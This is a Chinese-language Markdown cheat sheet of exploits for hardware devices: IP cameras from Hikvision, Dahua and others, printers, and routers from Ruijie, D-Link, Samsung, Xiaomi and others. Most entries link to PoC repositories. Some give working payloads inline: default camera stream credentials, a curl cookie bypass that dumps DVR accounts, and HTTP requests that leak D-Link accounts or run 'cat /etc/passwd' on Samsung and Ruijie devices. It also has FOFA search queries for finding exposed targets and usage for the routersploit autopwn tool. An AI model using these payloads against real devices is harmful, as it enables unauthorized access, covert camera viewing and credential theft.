# Device-Exploits

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**硬件产品默认口令**
- [硬件产品默认口令](http://www.r4v3zn.com/spear-framework/#/default-pwd/hardware-products)

---

# CPU

**Meltdown/Spectre**
- 相关文章
    - [An Explanation of the Meltdown/Spectre Bugs for a Non-Technical Audience](https://blog.cloudflare.com/meltdown-spectre-non-technical/)
    - [简单谈谈近期的 Intel 处理器漏洞](https://bbs.kafan.cn/thread-2112818-1-1.html)

- POC | Payload | exp
    - [speed47/spectre-meltdown-checker](https://github.com/speed47/spectre-meltdown-checker)
    - [Eugnis/spectre-attack](https://github.com/Eugnis/spectre-attack)
    - [turbo/KPTI-PoC-Collection](https://github.com/turbo/KPTI-PoC-Collection)
    - [google/security-research-pocs](https://github.com/google/security-research-pocs)
    - https://leaky.page/ - JavaScript编写的Spectre漏洞PoC，演示基于Web的Spectre攻击的可行性

**PLATYPUS**
- https://platypusattack.com/

---

# Camera

**RTSP 弱口令**
- 华为 : `rtsp://admin:HuaWei123@IP/LiveMedia/ch1/Media1`
- 海康威视 主码流 : `rtsp://admin:12345@IP:554/h264/ch1/main/av_stream`
- 海康威视 主码流 : `rtsp://admin:12345@IP:554/MPEG-4/ch1/main/av_stream`
- 海康威视 主码流 : `rtsp://admin:12345@IP:554/h264/ch1/main/av_stream`
- 海康威视 子码流 : `rtsp://admin:12345@IP/mpeg4/ch1/sub/av_stream`
- 海康威视 子码流 : `rtsp://admin:12345@IP/h264/ch1/sub/av_stream`
- 宇视 主码流 : `rtsp://admin:admin@IP:554/video1`
- 宇视 子码流 : `rtsp://admin:admin@IP:554/video2`
- 宇视 三码流 : `rtsp://admin:admin@IP:554/video3`

## 海康威视

**相关工具**
- [4n4nk3/HikPwn](https://github.com/4n4nk3/HikPwn)

**CVE-2017-7921**
- 相关文章
    - [Hikvision海康威视摄像头CVE-2017-7921漏洞解析](https://www.freebuf.com/vuls/278336.html)

- POC | Payload | exp
    - [WormChickenWizard/hikvision-decrypter](https://github.com/WormChickenWizard/hikvision-decrypter)

**CVE-2021-36260**
- POC | Payload | exp
    - [TaroballzChen/CVE-2021-36260-metasploit](https://github.com/TaroballzChen/CVE-2021-36260-metasploit)

## DVR

**CVE-2018-9995**
- POC | Payload | exp
    ```
    curl "http://xxx.xxx.xxx.xxx/device.rsp?opt=user&cmd=list" -H "Cookie: uid=admin"
    ```
    - [ezelf/CVE-2018-9995_dvr_credentials](https://github.com/ezelf/CVE-2018-9995_dvr_credentials)

## Dahua

**CVE-2017-7925**
- 相关文章
    - [摄像头漏洞实验](http://johan.vip/2017/10/15/camera-vul-exp/)
    - [大华摄像头backdoor，漏洞？](https://cloud.tencent.com/developer/article/1144902)
    - [exploit - dahua camera backdoor_Nixawk](https://blog.csdn.net/nixawk/article/details/62892129)

**CVE-2021-33044 & CVE-2021-33045**
- 相关文章
    - [大华摄像头 CVE-2021-33044-CVE-2021-33045 POC](https://mp.weixin.qq.com/s/-k34v9lDOYr3FEI_5RRp5w)
    - [天王级视频监控产品某华认证绕过漏洞CVE-2021-330*复现与分析](https://mp.weixin.qq.com/s/OqhPJ6oV9B5JfRuiUG-nbA)

- 相关工具
    - [mcw0/DahuaConsole](https://github.com/mcw0/DahuaConsole)

## D-Link

**CVE-2020-25078 DCS系列监控账号密码信息泄露**
- POC | Payload | exp
    ```
    /config/getuser?index=0
    ```

## VideoIQ

**VideoIQ Camera - Local File Disclosure**
- POC | Payload | exp
    - https://www.exploit-db.com/exploits/40284

---

# Printer

**相关文章**
- [How to make 60,000 printers print whatever you want](https://kur0sec.org/print)
- [An Introduction to Printer Exploitation](https://0x00sec.org/t/an-introduction-to-printer-exploitation/3565)
- [Researching The FAX Machine Attack Surface | X41 D-SEC GmbH](https://www.x41-dsec.de/lab/blog/fax/)
- [一个传真接管你的网络：含有传真功能的打印机漏洞分析](https://xz.aliyun.com/t/2573)
- [打印机PCL漏洞原理分析](https://www.cnblogs.com/anka9080/p/5235622.html)

**资源**
- [Hacking Printers](http://hacking-printers.net/wiki/index.php/Main_Page)

**相关工具**
- **PRET**
    ```bash
    # Installation
    git clone https://github.com/RUB-NDS/PRET.git
    cd PRET

    pip install colorama pysnmp

    # Usage
    python2 ./pret.py
    python2 ./pret.py xxx.xxx.xxx.xxx pjl
    python2 ./pret.py xxx.xxx.xxx.xxx ps
    python2 ./pret.py xxx.xxx.xxx.xxx pcl
    ```

---

# Router

**漏洞库**
- [Routerpwn - One click exploits, generators, tools, news, vulnerabilities, poc, alerts](http://routerpwn.com/)

**资源**
- [libc0607/Realtek_switch_hacking](https://github.com/libc0607/Realtek_switch_hacking)

**漏洞利用框架**
- **routersoloit**

    Installation
    ```bash
    git clone https://www.github.com/threat9/routersploit.git
    cd routersploit
    python3 -m pip install -r requirements.txt
    python3 rsf.py
    ```

    Usage
    ```bash
    use scanners/autopwn
    set target
    run
    ```

**相关工具**
- RouterPassView

## CISCO

**CVE-2017-6736 Cisco IOS remote code execution**
- 简介

    Cisco IOS 和 IOS XE 都是美国思科（Cisco）公司为其网络设备开发的操作系统。Simple Network Management Protocol（SNMP）subsystem 是其中的一个用于网络设备管理信息交换的简单网络管理子系统。

    Cisco IOS 12.0 版本至 12.4 版本、15.0 版本至 15.6 版本和 IOS XE 2.2 版本至 3.17 版本中的 SNMP 子系统中存在安全漏洞。远程攻击者可通过向受影响系统发送特制的 SNMP 数据包利用该漏洞在受影响的系统上执行任意代码或造成系统重启。以下版本受到影响：SNMP 1版本，2c版本，3版本。

- 影响版本
    - Cisco:Ios:12.0(28a):::
    - Cisco:Ios:12.1(19)ec:::
    - Cisco:Ios:12.2(14)s13:::
    - Cisco:Ios:12.1(19)e7:::
    - Cisco:Ios:12.2(14)s12:::

- POC | Payload | exp
    - [artkond/cisco-snmp-rce](https://github.com/artkond/cisco-snmp-rce)

**Type7密码解密**
- https://www.xiaopeiqing.com/cisco-password-cracker/
- http://www.ifm.net.nz/cookbooks/passwordcracker.html
- http://www.toolsxx.com/code/cisco.php

## h3c

**相关工具**
- [grutz/h3c-pt-tools](https://github.com/grutz/h3c-pt-tools)

**密文解密**
- https://raw.githubusercontent.com/grutz/h3c-pt-tools/master/hh3c_cipher.py
- http://blog.emaze.net/2012/11/weak-password-encryption-on-huawei.html

## 小米

**CVE-2019-18370**
- 简介

    Xiaomi Mi WiFi R3G 是中国小米科技（Xiaomi）公司的一款 3G 路由器。

    Xiaomi Mi WiFi R3G 2.28.23-stable 之前版本中存在输入验证错误漏洞。该漏洞源于网络系统或产品未对输入的数据进行正确的验证。

- 影响版本
    -  Mi:Millet_router_3g:-:*:*:*

- POC | Payload | exp
    - [Xiaomi_Mi_WiFi_R3G_Vulnerability_POC](https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC)

**CVE-2019-18371**
- 简介

    Xiaomi Mi WiFi R3G 2.28.23-stable 之前版本中存在路径遍历漏洞。该漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置。

- 影响版本
    -  Mi:Millet_router_3g:-:*:*:*

- POC | Payload | exp
    - [Xiaomi_Mi_WiFi_R3G_Vulnerability_POC](https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC)

## OpenWrt

**CVE-2019-12272 OpenWrt 图形化管理界面 LuCI 命令注入**
- 简介

    OpenWrt LuCI 是一款用于 OpenWrt（Linux 发行版）的图形化配置界面。

    OpenWrt LuCI 0.10 及之前版本中的 admin/status/realtime/bandwidth_status 和 admin/status/realtime/wireless_status 端点存在命令注入漏洞。该漏洞源于外部输入数据构造可执行命令过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞执行非法命令。

- 影响版本
    - Openwrt:Luci:0.10.0:::

- 相关文章
    - [CVE-2019-12272 OpenWrt图形化管理界面LuCI命令注入分析](https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20190710-lucirce.html)

- POC | Payload | exp
    - [HACHp1/LuCI_RCE_exp](https://github.com/HACHp1/LuCI_RCE_exp)

## Netlink

**Netlink GPON Router 1.0.11 - Remote Code Execution**
- 相关文章
    - [多款光纤路由器设备在野0-day漏洞简报](https://blog.netlab.360.com/multiple-fiber-routers-are-being-compromised-by-botnets-using-0-day/)

- POC | Payload | exp
    - [Netlink GPON Router 1.0.11 - Remote Code Execution](https://www.exploit-db.com/exploits/48225)

## ruijie

**CNVD-2021-09650 EWEB网管系统命令执行 /guest_auth/guestIsUp.php**
- FOFA: title:锐捷网络-EWEB网管系统
- POC | Payload | exp
    - [yumusb/EgGateWayGetShell_py](https://github.com/yumusb/EgGateWayGetShell_py)

**CNVD-2021-14536 锐捷 RG-UAC 统一上网行为管理审计系统信息泄露漏洞**
- FOFA: title="RG-UAC登录页面" && body="admin"
- 相关文章
    - https://www.cnblogs.com/cHr1s/p/14499858.html

**NBR路由器CLI命令执行漏洞    /WEB_VMS/LEVEL15/**
- FOFA: title="锐捷网络 --NBR路由器--登录界面"
- POC | Payload | exp
    - https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/PeiQi/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7NBR%201300G%E8%B7%AF%E7%94%B1%E5%99%A8%20%E8%B6%8A%E6%9D%83CLI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md

**锐捷网关（RG-EG）信息泄露管理员账号密码+RCE**
- 简介

    登陆后可配合 /cli.php?a=shell 执行命令,body为 notdelay=truecommand=cat /etc/passwd

- FOFA: app="Ruijie-EG易网关"
- POC | Payload | exp
    - https://github.com/chaitin/xray/pull/1214
    - https://mp.weixin.qq.com/s/jgNyTHSqWA5twyk5tfSQUQ
    - https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/PeiQi/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3%20download.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
    - https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/PeiQi/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3%20cli.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
    - https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/PeiQi/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3%20branch_passw.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md

**锐捷EG易网关 phpinfo.view.php 信息泄露漏洞**
- POC | Payload | exp
    ```
    /tool/view/phpinfo.view.php
    ```

## Samsung

**三星 WLAN AP WEA453e路由器远程命令执行**
- FOFA: title=="Samsung WLAN AP"
- POC | Payload | exp
    ```
    POST /(download)/tmp/a.txt HTTP/1.1

    command1=shell:cat /etc/passwd| dd of=/tmp/a.txt
    ```

## 飞鱼星

**权限绕过信息泄露漏洞**
- FOFA: title="飞鱼星企业级智能上网行为管理系统"
- FOFA: title="飞鱼星家用智能路由"
- [飞鱼星 企业级智能上网行为管理系统 权限绕过信息泄露漏洞](https://mp.weixin.qq.com/s/Lz08AHM1vrBvLbI2zKVCxg)

## iKuai

**相关文章**
- [爱快流控路由最新版(iKuai8_2.4.4_Build20150604-17_41)固件漏洞挖掘分析之一](https://php.mengsec.com/bugs/wooyun-2015-0122413.html)
- [iKuai8 爱快软路由后台构造页面执行任意Linux命令](http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2015-0121467)

**SQL注入漏洞**
- [iKuai 流控路由 SQL注入漏洞](http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/iKuai/iKuai%20%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html)
- http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/iKuai/iKuai%20%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
- http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2015-0123161
- http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2015-0123224
- http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2016-0188867

## D-Link

**CVE-2019-17506 D-Link Dir-645 getcfg.php 账号密码泄露漏洞**
- POC | Payload | exp
    ```
    POST /getcfg.php HTTP/1.1
    Content-Type: application/x-www-form-urlencoded

    SERVICES=DEVICE.ACCOUNT&attack=ture%0D%0AAUTHORIZED_GROUP%3D1
    ```

## DrayTek

**CVE-2020-8515**
- [CVE-2020-8515 漏洞分析与利用](https://www.hayasec.me/2020/03/31/cve-2020-8515/)

## Netgear

**Netgear WNR2000 - Multiple Information Disclosure Vulnerabilities**
- POC | Payload | exp
    - https://www.exploit-db.com/exploits/33177

## TP-Link

**CVE-2021-41653 TL-WR840N rce**
- 相关文章
    - [TP-Link TL-WR840N 远程命令执行漏洞（CVE-2021-41653）](https://mp.weixin.qq.com/s/BrP8uZ39buV9wNJpFkktoQ)
    - [TP-Link TL-WR840N EU v5 Remote Code Execution](https://k4m1ll0.com/cve-2021-41653.html)

- POC | Payload | exp
    - [ohnonoyesyes/CVE-2021-41653](https://github.com/ohnonoyesyes/CVE-2021-41653)
